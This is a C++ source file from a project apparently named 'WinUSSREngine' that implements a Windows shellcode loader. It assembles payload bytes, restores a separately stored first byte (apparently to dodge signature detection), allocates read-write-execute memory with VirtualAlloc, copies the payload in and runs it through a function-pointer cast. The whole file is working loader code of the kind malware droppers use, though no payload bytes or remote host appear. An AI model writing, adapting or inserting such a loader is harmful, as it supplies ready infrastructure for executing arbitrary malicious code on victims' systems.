#include "ShellExec.h"

namespace WinUSSREngine
{
	ShellExec::ShellExec() { }

	void ShellExec::run(const Shellcode& props)
	{
		std::vector<unsigned char> payload;
		for (auto bytes : props.bytes())
			payload.push_back(bytes);

		// If the program can't perform lpPayload, it quits with error 1.
		LPVOID lpPayload = VirtualAlloc(NULL, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (lpPayload)
		{
			if (props.firstbyte() != 0)
			{
				// pointers
				unsigned char firstbyte = props.firstbyte();
				unsigned char* pFirstByte = &firstbyte;
				memcpy(payload.data(), pFirstByte, 1);				 // This copies the first byte
																	 // back into where it needs to be.
			}

			ZeroMemory(lpPayload, payload.size());					 // Makes room for the payload to be there.
			memcpy(lpPayload, payload.data(), payload.size());		 // Copies the payload to where we need it.
			runShellCode(lpPayload);
		}
	}

	void ShellExec::runShellCode(LPVOID& lpPayload)
	{
		void(*function)();				 // Declares a pointer on a function.
		function = (void(*)())lpPayload; // Casts the shellcode onto the function.
		(void)(*function)();			 // Calls the function.
	}
}